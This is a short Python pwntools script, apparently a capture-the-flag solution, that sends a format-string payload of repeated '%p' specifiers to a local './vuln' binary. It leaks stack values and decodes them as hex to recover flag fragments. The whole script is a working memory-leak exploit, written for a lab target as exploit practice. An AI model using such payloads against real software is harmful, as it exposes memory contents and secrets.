"""
attempt to dump addresses from the stack
but only part of the flag was shown (found out later it was actually there but split into pieces and each piece inverted).
"""
import pwn

# make a payload containing 14 times %p.
payload: bytes = (14*"%p.").encode("utf-8")

# open the vulnerable program
proc = pwn.process("./vuln")

proc.recvuntil(b"ou:")
proc.sendline(payload)

# filter the response
output: str = proc.recvuntil(b"ye!").decode().strip()
output: str = output.replace("Here's your order: ", "", -1)\
                    .replace("Bye!", "", -1)\
                    .replace("\n", "", -1)

# split the response using dot as separator
output: list[str] = output.split(sep=".", maxsplit=-1)

for word in output:

    word = word[2::].replace("il)", "", -1)

    if word != '' and word != "il)":
        try:
            print(f"{word}  =  {bytes.fromhex(word).decode('utf-8', errors='ignore')}")
        except Exception:
            pass
    continue

proc.close()
